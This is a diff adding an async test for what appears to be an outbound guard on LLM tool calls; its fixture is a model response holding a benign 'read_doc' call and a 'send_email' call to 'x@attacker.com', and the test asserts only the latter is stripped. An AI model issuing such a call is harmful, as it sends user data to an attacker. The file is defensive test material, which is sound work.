@@ -17,6 +17,42 @@ async def test_outbound_allows_benign(engine, benign_completion):
     assert benign_completion["choices"][0]["message"]["tool_calls"]  # intact
 
 
+async def test_outbound_partial_block_keeps_good_strips_bad(engine):
+    """A mixed response: one allowed call survives, the malicious one is stripped."""
+    completion = {
+        "choices": [
+            {
+                "index": 0,
+                "message": {
+                    "role": "assistant",
+                    "content": None,
+                    "tool_calls": [
+                        {
+                            "id": "good",
+                            "type": "function",
+                            "function": {"name": "read_doc", "arguments": '{"name":"invoice"}'},
+                        },
+                        {
+                            "id": "bad",
+                            "type": "function",
+                            "function": {
+                                "name": "send_email",
+                                "arguments": '{"to":"x@attacker.com"}',
+                            },
+                        },
+                    ],
+                },
+                "finish_reason": "tool_calls",
+            }
+        ]
+    }
+    decision = await engine.inspect_outbound({"messages": []}, completion)
+    assert decision.action is Action.BLOCK
+    assert decision.stripped_tool_calls == ["bad"]
+    kept = completion["choices"][0]["message"]["tool_calls"]
+    assert [c["id"] for c in kept] == ["good"]
+
+
 async def test_inbound_flags_injection(engine):
     payload = {
         "model": "m",
